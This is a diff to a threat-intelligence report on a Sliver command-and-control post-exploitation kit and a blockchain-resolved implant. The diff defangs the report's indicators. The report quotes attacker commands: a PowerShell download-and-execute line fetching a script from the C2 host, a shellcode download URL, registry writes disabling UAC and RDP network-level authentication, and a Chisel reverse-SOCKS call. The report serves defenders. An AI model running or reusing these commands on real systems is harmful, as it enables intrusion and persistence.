@@ -28,7 +28,7 @@ thumbnail: /assets/images/cards/sliver-c2-windows-postex-staging-193-233-202-17.
 stix_bundle: /stix/sliver-c2-windows-postex-staging-193-233-202-17.json
 ---
 
-**Campaign Identifier:** Sliver-C2-Windows-PostEx-Staging-193.233.202.17<br>
+**Campaign Identifier:** Sliver-C2-Windows-PostEx-Staging-193[.]233[.]202[.]17<br>
 **Last Updated:** September 7, 2026<br>
 **Threat Level:** HIGH
 
@@ -38,7 +38,7 @@ stix_bundle: /stix/sliver-c2-windows-postex-staging-193-233-202-17.json
 {: .hl-tier-1}
 {: .hl-tab-overview}
 
-An open directory on `193.233.202.17` held a complete Windows post-exploitation kit built around a Sliver command-and-control beacon, together with a second and entirely separate implant that reads its C2 address out of an Ethereum smart contract. The operator reached a Windows Active Directory estate at one US organisation, created a Domain Admin account by script, disabled endpoint protection by product-specific service name, and subverted the victim's own DNS content filter through its administrative API so their C2 domain would resolve and pass the filter.
+An open directory on `193[.]233[.]202[.]17` held a complete Windows post-exploitation kit built around a Sliver command-and-control beacon, together with a second and entirely separate implant that reads its C2 address out of an Ethereum smart contract. The operator reached a Windows Active Directory estate at one US organisation, created a Domain Admin account by script, disabled endpoint protection by product-specific service name, and subverted the victim's own DNS content filter through its administrative API so their C2 domain would resolve and pass the filter.
 
 The most useful thing I can say about this actor is where they spent their effort. Everything that gets them onto a host and elevates them is public tooling used stock. Everything bespoke is knowledge of one specific network. They did not build a better exploit, they built better knowledge of one estate.
 
@@ -58,7 +58,7 @@ They created an Active Directory account with a non-expiring password and added 
 
 The standout piece of tradecraft is the DNS filter bypass, and it is the clearest evidence of how well they understood this particular environment. Three scripts drive the victim's commercial DNS content filter through its own administrative API. One of them logs in, downloads the appliance's client-side JavaScript, and runs a regular expression over it to discover the product's API endpoint names from its own front-end code rather than guessing at paths. Then it whitelists the operator's domain. Four further scripts plant a matching A record into the victim's AD-integrated DNS zone, pointing inward at the filtering appliance itself. The whitelist entry and the DNS record are one mechanism rather than two, because the record makes the name resolve internally and the whitelist makes the filter permit it.
 
-That whitelisted domain, `publisherresolution.com`, is also the first value ever written to the Ethereum resolver contract used by the second implant. That single fact is what proves the Sliver strand and the blockchain strand are one operation rather than two tools that happened to share a directory.
+That whitelisted domain, `publisherresolution[.]com`, is also the first value ever written to the Ethereum resolver contract used by the second implant. That single fact is what proves the Sliver strand and the blockchain strand are one operation rather than two tools that happened to share a directory.
 
 ### What the operator built, and what they bought
 
@@ -94,7 +94,7 @@ For the campaign rather than the intrusion, poll the resolver contract.
 
 This infrastructure was not found first here, and saying so plainly is the honest frame for everything that follows.
 
-Huntress got there first, on 2026-05-21, and theirs is the contribution this report leans on hardest. They observed `193.233.202.17` acting as scheduled-task command and control inside a confirmed ransomware incident of their own, complete with a signatured encryptor and the group's ransom note. That is first-party SOC telemetry rather than an inference drawn from someone else's write-up, and it is the reason the ransomware association in Section 11 holds at all. The sensitivity check there is blunt about it, because removing that one piece of evidence collapses the association outright.
+Huntress got there first, on 2026-05-21, and theirs is the contribution this report leans on hardest. They observed `193[.]233[.]202[.]17` acting as scheduled-task command and control inside a confirmed ransomware incident of their own, complete with a signatured encryptor and the group's ransom note. That is first-party SOC telemetry rather than an inference drawn from someone else's write-up, and it is the reason the ransomware association in Section 11 holds at all. The sensitivity check there is blunt about it, because removing that one piece of evidence collapses the association outright.
 
 They published no file hash for the binary they saw, so nothing here rests on a hash comparison against their work. That is a difference in evidence type rather than a difference in strength, and on the question that matters most in this case their evidence is the stronger of the two.
 
@@ -215,7 +215,7 @@ The capstone is a weekly task disguised under a plausible internal business-appl
 Its action is a single line:
 
 ```
-powershell -ep bypass -w hidden -NonInteractive -c iex((New-Object Net.WebClient).DownloadString('http://193.233.202.17:42718/task_39.ps1'))
+[p]owershell -ep bypass -w hidden -NonInteractive -c iex((New-Object Net.WebClient).DownloadString('hxxp://193[.]233[.]202[.]17:42718/task_39.ps1'))
 ```
 
 That is a fileless download-and-execute of the full attack chain, re-pulled fresh from the C2 on every run rather than executing a static payload. It is a materially different persistence property from a dropped binary, because whatever the operator changes on their server ships to every persisted host at the next weekly trigger. A defender who removes the payload but leaves the task has removed nothing.
@@ -230,9 +230,9 @@ The account work starts with a script that binds to the victim's AD domain by na
 Three registry writes then weaken the host's own controls:
 
 ```
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+[r]eg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+[r]eg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+[r]eg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 
 The third is passed as an argument to `GodPotato.Program.Main` by the reflective loaders, so that write executes at SYSTEM from inside an injected assembly rather than from a script an EDR would see.
@@ -240,8 +240,8 @@ The third is passed as an argument to `GodPotato.Program.Main` by the reflective
 Two more writes enable RDP and disable Network Level Authentication:
 
 ```
-reg add 'HKLM\System\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f
-reg add 'HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' /v UserAuthentication /t REG_DWORD /d 0 /f
+[r]eg add 'HKLM\System\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f
+[r]eg add 'HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' /v UserAuthentication /t REG_DWORD /d 0 /f
 ```
 
 Disabling Network Level Authentication is the choice worth noticing. It widens the pre-authentication attack surface on every host it touches, and the operator does not need it for their own access. They took a step that makes the victim more exposed to everyone else in exchange for nothing.
@@ -252,7 +252,7 @@ Credential collection runs down three independent routes. One script opens a han
 
 Three enumeration scripts are three iterations of one technique. Each steals a logged-on user's token through `WTSQueryUserToken` and `ImpersonateLoggedOnUser`, using P/Invoke C# injected with `Add-Type`, then under that identity enumerates all non-disabled AD users through `DirectorySearcher`, lists cached Kerberos tickets with `klist`, and probes SMB reachability of the `ADMIN$` and `C$` shares. The iterations grow. The first pulls `sAMAccountName`, `badPwdCount` and `lockoutTime`; the second adds `memberOf`; the third adds `adminCount` and `userAccountControl`. That `adminCount` filter is explicit hunting for current or former privileged accounts.
 
-Three shellcode injection scripts all use `VirtualAlloc` at read-write, then `Marshal.Copy`, then `VirtualProtect` to read-execute, then `CreateThread`. Writing then flipping rather than allocating read-write-execute outright is mild but real EDR awareness. One pulls its shellcode from `http://193.233.202.17:8088/slv_beacon_sc.bin` and explicitly sets `GlobalProxySelection.GetEmptyWebProxy()` to bypass any configured corporate proxy before downloading.
+Three shellcode injection scripts all use `VirtualAlloc` at read-write, then `Marshal.Copy`, then `VirtualProtect` to read-execute, then `CreateThread`. Writing then flipping rather than allocating read-write-execute outright is mild but real EDR awareness. One pulls its shellcode from `hxxp://193[.]233[.]202[.]17:8088/slv_beacon_sc.bin` and explicitly sets `GlobalProxySelection.GetEmptyWebProxy()` to bypass any configured corporate proxy before downloading.
 
 The other two read the same payload over SMB from the victim's own internal file server. That is the most under-appreciated mechanism in the whole kit, because it means the operator staged their implant shellcode on compromised infrastructure and pulled it back down from inside. A defender watching for external downloads sees an internal file read.
 
@@ -270,7 +270,7 @@ Seven scripts drive mass deployment against an eighteen-host internal fleet on a
 | `dep2.ps1` | PowerShell equivalent through a mapped drive | `WindowsUpdSvc31` |
 | `deploy2.cmd` | 10-host subset, `certutil` then `msiexec /i ... /quiet /norestart` from port 39287 | `WinSvcUpdate2` |
 | `deploy.cmd` | SMB copy first, falling back to `wmic /node:<host> process call create` invoking certutil; MSI served from port 44321 | `WinSvcUpdate2` |
-| `run_chisel.bat` | Chisel client as `client 193.233.202.17:22673 R:socks`, a reverse SOCKS proxy with the binary disguised as a service | none |
+| `run_chisel.bat` | Chisel client as `client 193[.]233[.]202[.]17:22673 R:socks`, a reverse SOCKS proxy with the binary disguised as a service | none |
 
 Every deployment task runs `/sc ONSTART` or `/sc once` as SYSTEM, deletes any existing task of the same name before recreating it, and triggers immediately with `schtasks /run`. The fallback chain is the part worth carrying, because a single blocked transfer path does not stop the deployment.
 
@@ -286,7 +286,7 @@ Remote task deployment rides on a base64-encoded batch script, 387 bytes once de
 
 The kit runs two command-and-control channels that share almost nothing technically. One is a Sliver beacon talking to a raw IP address. The other is a Node.js implant that asks a public blockchain where to report. They look like two separate operations that happened to be staged in the same directory, and for a while I treated them that way.
 
-They are one operation, and a single fact settles it. The first value ever written to the resolver contract is `publisherresolution.com`, which is the same domain the operator whitelisted through the victim's DNS-filtering appliance and planted as an internal AD DNS record. The strand that never touches a blockchain went to considerable trouble to make the blockchain strand's first C2 domain resolve and pass filtering inside the victim's network.
+They are one operation, and a single fact settles it. The first value ever written to the resolver contract is `publisherresolution[.]com`, which is the same domain the operator whitelisted through the victim's DNS-filtering appliance and planted as an internal AD DNS record. The strand that never touches a blockchain went to considerable trouble to make the blockchain strand's first C2 domain resolve and pass filtering inside the victim's network.
 
 ### The Node.js implant, and its bring-your-own-runtime bootstrap
 
@@ -348,11 +348,11 @@ The contract emits an event on every write, and enumerating those events over th
 | Nonce | Block | Set at (UTC) | Value |
 |---|---|---|---|
 | 0 | 24,777,993 | 2026-03-31 13:49:11 | contract deployed |
-| 1 | 24,783,833 | 2026-04-01 09:24:11 | `https://publisherresolution.com` |
-| 2 | 24,980,089 | 2026-04-28 17:35:11 | `https://resumeacceptable.com` |
-| 3 | 25,302,771 | 2026-06-12 17:06:35 | `https://simultaneouslypower.com` |
-| 4 | 25,345,369 | 2026-06-18 15:33:35 | `https://wiselystarting.com` |
-| 5 | 25,437,624 | 2026-07-01 12:19:59 | `https://itemrange.com` |
+| 1 | 24,783,833 | 2026-04-01 09:24:11 | `hxxps://publisherresolution[.]com` |
+| 2 | 24,980,089 | 2026-04-28 17:35:11 | `hxxps://resumeacceptable[.]com` |
+| 3 | 25,302,771 | 2026-06-12 17:06:35 | `hxxps://simultaneouslypower[.]com` |
+| 4 | 25,345,369 | 2026-06-18 15:33:35 | `hxxps://wiselystarting[.]com` |
+| 5 | 25,437,624 | 2026-07-01 12:19:59 | `hxxps://itemrange[.]com` |
 
 Across the whole five-month history no second address has ever called the setter. The design says shared resolution surface and the observed use says single tenant, and both halves of that are worth keeping.
 
@@ -384,12 +384,12 @@ The hosting is a mixed stack rather than one bulletproof provider, and the regis
 
 ### The host does not have a country, and that is the finding
 
-Anyone who looks up `193.233.202.17` will get a country back, and whichever one they get will be incomplete. Live geolocation sources disagree with each other on this address, and the registry data disagrees with itself at different levels of the allocation. Rather than pick one, here is the whole structure with the object each part comes from.
+Anyone who looks up `193[.]233[.]202[.]17` will get a country back, and whichever one they get will be incomplete. Live geolocation sources disagree with each other on this address, and the registry data disagrees with itself at different levels of the allocation. Rather than pick one, here is the whole structure with the object each part comes from.
 
 The `/24` that actually covers this host is the most specific object, it is named `Netcrafters-OU`, its RDAP **country field reads US**, and its registrant is NetCrafters OU. That registrant's own contact record declares a postal address in Kohtla-Jarve, Estonia. The `/24` sits inside a `/23` named `AGROSNAB-NET-233-202`, a direct structural relationship rather than an inference, and that `/23` carries **country RU**, with OOO AGROSNAB as registrant and administrative and technical contacts declaring addresses in Yekaterinburg. Both netblocks share a single Russian maintainer object, `mnt-ru-am-1`. The autonomous system announcing all of it, AS203273, **carries no country field at all**.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/sliver-c2-windows-postex-staging-193-233-202-17/sliver-c2-as203273-rdap-layers.svg" | relative_url }}" alt="Vertical four-layer infographic titled The Host Has No One Country, subtitled Four RDAP objects, four different answers, all correct. Layer 1, grey band, AS203273, NetCraftersOU: no country field anywhere on the ASN object itself, though its registrant declares a postal address in Kohtla-Jarve, Ida-Viru maakond, Estonia, so the Estonian reading is a declared address plus an OU company-form inference, not a registry field. Layer 2, grey band, slash-23 sub-allocation AGROSNAB-NET-233-202: a separate object one step down, with country explicitly RU, registrant OOO AGROSNAB in Yekaterinburg, type SUB-ALLOCATED PA, not yet the object that covers the host. Layer 3, yellow band, slash-24 assignment Netcrafters-OU, the most specific object: this is the object that actually covers 193.233.202.17, type ASSIGNED PA, country US, sitting one layer inside the Russian slash-23, and the most-specific object is the one that should govern a lookup; detection hint notes live GeoIP tools read whichever layer their database last cached. Layer 4, deep red band, Synthesis, Never Write a Single Country: one maintainer, mnt-ru-am-1, holds both the slash-23 and the slash-24, so the Russian and US-flagged objects are not arm's-length parties; Securebit AG also appears on the ASN object as a RIPE sponsoring LIR, not a link. Footer states there is no detection anchor since this is a registration-mechanics finding, and that it was verified directly against the raw RDAP objects and independently re-derived twice with identical results, plus a color legend.">
+  <img loading="lazy" src="{{ "/assets/images/sliver-c2-windows-postex-staging-193-233-202-17/sliver-c2-as203273-rdap-layers.svg" | relative_url }}" alt="Vertical four-layer infographic titled The Host Has No One Country, subtitled Four RDAP objects, four different answers, all correct. Layer 1, grey band, AS203273, NetCraftersOU: no country field anywhere on the ASN object itself, though its registrant declares a postal address in Kohtla-Jarve, Ida-Viru maakond, Estonia, so the Estonian reading is a declared address plus an OU company-form inference, not a registry field. Layer 2, grey band, slash-23 sub-allocation AGROSNAB-NET-233-202: a separate object one step down, with country explicitly RU, registrant OOO AGROSNAB in Yekaterinburg, type SUB-ALLOCATED PA, not yet the object that covers the host. Layer 3, yellow band, slash-24 assignment Netcrafters-OU, the most specific object: this is the object that actually covers 193[.]233[.]202[.]17, type ASSIGNED PA, country US, sitting one layer inside the Russian slash-23, and the most-specific object is the one that should govern a lookup; detection hint notes live GeoIP tools read whichever layer their database last cached. Layer 4, deep red band, Synthesis, Never Write a Single Country: one maintainer, mnt-ru-am-1, holds both the slash-23 and the slash-24, so the Russian and US-flagged objects are not arm's-length parties; Securebit AG also appears on the ASN object as a RIPE sponsoring LIR, not a link. Footer states there is no detection anchor since this is a registration-mechanics finding, and that it was verified directly against the raw RDAP objects and independently re-derived twice with identical results, plus a color legend.">
   <figcaption><em>Figure 3: The four separate RDAP objects behind one IP address, read top to bottom from the broadest to the most specific. The most-specific object, the one that actually covers this host, is the one most reports would miss, and it is the one that disagrees with the inferred "Estonian" reading.</em></figcaption>
 </figure>
 
@@ -399,21 +399,21 @@ The AS203273 record also lists Securebit AG, a Swiss company, in administrative,
 
 ### This address has had many tenants
 
-Fourteen distinct certificate identities appear on `193.233.202.17` between 2022-09-05 and 2026-08-24, across ports 443, 631, 3389 and 8181, alongside nine distinct JARM groups. That is a churning address rather than a stable machine, and it changes what the pre-campaign history is worth. Artifacts older than this campaign probably belong to different tenants, so the earlier certificate names on this address are not this operator's and should not be pivoted on.
+Fourteen distinct certificate identities appear on `193[.]233[.]202[.]17` between 2022-09-05 and 2026-08-24, across ports 443, 631, 3389 and 8181, alongside nine distinct JARM groups. That is a churning address rather than a stable machine, and it changes what the pre-campaign history is worth. Artifacts older than this campaign probably belong to different tenants, so the earlier certificate names on this address are not this operator's and should not be pivoted on.
 
-That churn also disposes of an apparent link that looks exactly like a real one. The current port-3389 JARM fingerprint on this host is byte-identical to a port-3389 JARM on `77.110.126.46`, which is the shape of strong infrastructure overlap. It is not one. Measured across the corpus, that fingerprint appears on 1,307,847 unique address and port pairs, which puts it firmly in hosting context. It also fails on ownership, because a JARM is produced by the RDP and TLS stack, which is Microsoft's work rather than the operator's, so a shared value links that supplier's customers rather than these operators. Graded **INSUFFICIENT**, and it is not in the feed.
+That churn also disposes of an apparent link that looks exactly like a real one. The current port-3389 JARM fingerprint on this host is byte-identical to a port-3389 JARM on `77[.]110[.]126[.]46`, which is the shape of strong infrastructure overlap. It is not one. Measured across the corpus, that fingerprint appears on 1,307,847 unique address and port pairs, which puts it firmly in hosting context. It also fails on ownership, because a JARM is produced by the RDP and TLS stack, which is Microsoft's work rather than the operator's, so a shared value links that supplier's customers rather than these operators. Graded **INSUFFICIENT**, and it is not in the feed.
 
 The same applies to the current certificate common name on port 3389, which has the shape of a provider-generated instance label, and to a Windows auto-generated self-signed certificate found on the other address. All three are RDP-layer artifacts on this provider's hosts, and all three are generated by the provider or the operating system rather than authored by the operator. The RDP layer on this provider tells you about the provider.
 
-I checked a second address that a vendor placed in the same article, `77.110.122.137`, and it does not link either. It shares only the autonomous system with our host, with no shared certificate fingerprint, no shared JARM, no shared SSH host key and no overlapping certificate subject across ten distinct certificate identities in fifteen months. Two addresses appearing in one write-up is not a link.
+I checked a second address that a vendor placed in the same article, `77[.]110[.]122[.]137`, and it does not link either. It shares only the autonomous system with our host, with no shared certificate fingerprint, no shared JARM, no shared SSH host key and no overlapping certificate subject across ten distinct certificate identities in fifteen months. Two addresses appearing in one write-up is not a link.
 
 ### The secondary addresses, and how to handle them
 
-`77.110.126.46` is hunt-only and must never be blocked. Operator use is certain, because it is hardcoded as a third-tier fallback inside four binaries (`ws35.exe`, `ws36.exe`, `ws37.exe` and `ws_3srv.exe`), which is operator-authored evidence of a different class from anything the hosting can tell you. Ownership of the box is a separate question and it stays **NOT ESTABLISHED**. Two independent methods both show low identity churn there, which rules out the reassignment explanation but does not discriminate between a compromised third party and an operator-owned host. Blocking an address whose owner is unknown risks a bystander for no gain against an operator who has already demonstrated they rotate.
+`77[.]110[.]126[.]46` is hunt-only and must never be blocked. Operator use is certain, because it is hardcoded as a third-tier fallback inside four binaries (`ws35.exe`, `ws36.exe`, `ws37.exe` and `ws_3srv.exe`), which is operator-authored evidence of a different class from anything the hosting can tell you. Ownership of the box is a separate question and it stays **NOT ESTABLISHED**. Two independent methods both show low identity churn there, which rules out the reassignment explanation but does not discriminate between a compromised third party and an operator-owned host. Blocking an address whose owner is unknown risks a bystander for no gain against an operator who has already demonstrated they rotate.
 
 One correction matters here, because the natural assumption about that address is wrong. A domain that formerly resolved to it is seized and sinkholed infrastructure rather than a third party's own service, so do not reason about it as a bystander's server. Four file hashes shared between the address and that domain remain unidentified, and that is a named gap rather than a checked negative.
 
-`146.103.127.44` is historical only. It was operator-used in April 2026, it appears in six filenames across five unique binaries, and the address has since been reassigned to an unrelated occupant. Monitor it, do not block it.
+`146[.]103[.]127[.]44` is historical only. It was operator-used in April 2026, it appears in six filenames across five unique binaries, and the address has since been reassigned to an unrelated occupant. Monitor it, do not block it.
 
 ### Domain registration, and the one strong fingerprint
 
@@ -486,7 +486,7 @@ Everything in this section is the implant's own behaviour rather than an inferen
 
 ### The beacon, and the mistake in its configuration
 
-The implant beacons to `193.233.202.17` on two ports at once, 295 packets to port 443 and 191 to port 80. Each cycle is a pair of connections, a TLS session to 443 followed roughly 40 milliseconds later by a plaintext HTTP POST to 80, from consecutive ephemeral source ports.
+The implant beacons to `193[.]233[.]202[.]17` on two ports at once, 295 packets to port 443 and 191 to port 80. Each cycle is a pair of connections, a TLS session to 443 followed roughly 40 milliseconds later by a plaintext HTTP POST to 80, from consecutive ephemeral source ports.
 
 Port 80 on this host is a C2 listener rather than a misconfigured web server. An external probe in July had already recorded that it accepts TCP but does not speak HTTP, timing out at the application layer, and the implant using it as a beacon channel confirms that reading rather than merely being consistent with it.
 
@@ -687,7 +687,7 @@ That single paragraph is the answer most readers need, and everything below is w
 
 Who ran this intrusion is INSUFFICIENT, and I cannot attribute it. No named actor fits the evidence well enough to survive the alternatives.
 
-That `193.233.202.17` served as command and control in a confirmed The Gentlemen ransomware deployment during this operator's tenancy is HIGH, at approximately 88 percent, and strong indicators support it. Two things carry that. Huntress observed this address as scheduled-task C2 in a confirmed Gentlemen incident, complete with a signatured encryptor and the group's own ransom note, and that is their own first-party incident telemetry rather than an inference drawn from someone else's write-up. Separately, the Chisel reverse-SOCKS invocation, the service-binary masquerade and the scheduled-task naming family in their incident all match the equivalents in the kit captured here.
+That `193[.]233[.]202[.]17` served as command and control in a confirmed The Gentlemen ransomware deployment during this operator's tenancy is HIGH, at approximately 88 percent, and strong indicators support it. Two things carry that. Huntress observed this address as scheduled-task C2 in a confirmed Gentlemen incident, complete with a signatured encryptor and the group's own ransom note, and that is their own first-party incident telemetry rather than an inference drawn from someone else's write-up. Separately, the Chisel reverse-SOCKS invocation, the service-binary masquerade and the scheduled-task naming family in their incident all match the equivalents in the kit captured here.
 
 That the operator captured here is themselves a The Gentlemen affiliate who deployed the encryptor is LOW, at approximately 60 percent, and only weak indicators suggest it. Everything recovered stops short of Impact. There is no encryptor in this corpus, and a kit that establishes access, credentials, tunnels and persistence is exactly as consistent with selling that access as with using it.
 
@@ -743,7 +743,7 @@ Three things about that feed are worth reading before you ingest it.
 
 The contract address is the durable indicator and the hashes mostly are not. Domains rotated five times in five months and the contract address has never changed, because it cannot change without redeploying to every victim. For the Node.js strand specifically, hashes are close to worthless across victims by design, since the C2 re-obfuscates the bot server-side per victim on first run. Hunt the operational constants that re-obfuscation cannot touch, which are the contract address, the storage key, the ABI selector, the build identifier and the custom polling header.
 
-Two addresses carry handling constraints that a bare blocklist would destroy. `77.110.126.46` is marked hunt only and must never be blocked, because operator use is certain while ownership of the box is not established. `146.103.127.44` is historical, April 2026 only, and has since been reassigned to an unrelated occupant, so it is monitor rather than block. A feed consumer that flattens these into one blocklist will harm a third party and gain nothing, since the operator has already moved.
+Two addresses carry handling constraints that a bare blocklist would destroy. `77[.]110[.]126[.]46` is marked hunt only and must never be blocked, because operator use is certain while ownership of the box is not established. `146[.]103[.]127[.]44` is historical, April 2026 only, and has since been reassigned to an unrelated occupant, so it is monitor rather than block. A feed consumer that flattens these into one blocklist will harm a third party and gain nothing, since the operator has already moved.
 
 The feed carries an explicit exclusions list and it is not padding. Twelve values were considered as indicators and rejected on a stated test, each with the test recorded. The JA3 fingerprint is there at its measured 3,645 hosts, the shared JARM at its measured 1,307,847 address and port pairs, the same-autonomous-system address that a vendor grouped with ours, and a set of Go string-pool artifacts that look like indicators but are compiler and runtime residue. Publishing what was rejected and why is the part that lets somebody else check the work rather than take it on faith.
 
@@ -827,7 +827,7 @@ The Sliver version is unrecovered, stripped by symbol obfuscation and absent fro
 
 The beacon shellcode blob yields nothing to static string analysis, and that is a genuine negative rather than an unchecked one, so unpacking is the only route to it. The Go stub code past the point where it hands `cmd.exe` to the socket has not been decompiled, though what it does before that point is fully established.
 
-Three related samples were never obtainable, and the remaining acquisition route is quota-blocked. Four file hashes shared between `77.110.126.46` and a seized domain remain unidentified, which is a named gap and not a checked negative.
+Three related samples were never obtainable, and the remaining acquisition route is quota-blocked. Four file hashes shared between `77[.]110[.]126[.]46` and a seized domain remain unidentified, which is a named gap and not a checked negative.
 
 Several prevalence questions stay unmeasured and are recorded as NOT CHECKED rather than as weak positives. The MSI UpgradeCode's prevalence across unrelated samples is one. Whether the four-constant contract fingerprint is unique beyond the four publicly known contracts in that family is another, since the comparison covers the known set rather than the whole chain. And the combination of reverse-SOCKS invocation, service masquerade and task-naming family that ties this kit to the published ransomware incident has no measured denominator, so it corroborates rather than proves.
 
@@ -847,7 +847,7 @@ Each of those was one cheap check away, and each is recorded here rather than qu
 
 Prior publication on this infrastructure, in date order:
 
-- **Huntress** (2026-05-21): "The Gentlemen Ransomware Defense Evasion TTPs". First-party incident telemetry naming `193.233.202.17` as scheduled-task command and control in a confirmed ransomware deployment. [huntress.com](https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps)
+- **Huntress** (2026-05-21): "The Gentlemen Ransomware Defense Evasion TTPs". First-party incident telemetry naming `193[.]233[.]202[.]17` as scheduled-task command and control in a confirmed ransomware deployment. [huntress.com](https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps)
 - **Huntress** (2026-06-16): "Potemkin Loader, RMMProject and ClickFix". Names the same Ethereum contract entry resolving C2 for a different toolset, and attaches no actor attribution of its own. [huntress.com](https://www.huntress.com/blog/potemkin-loader-rmmproject-clickfix-attack)
 - **Hunt.io** (2026-08-04): "The Gentlemen Affiliate Deploys EtherRAT". Same address, same contract, same five historical C2 domains, with eleven published file hashes matching this corpus byte for byte. [hunt.io](https://hunt.io/blog/the-gentlemen-etherrat-ethereum-smart-contract-c2)
 
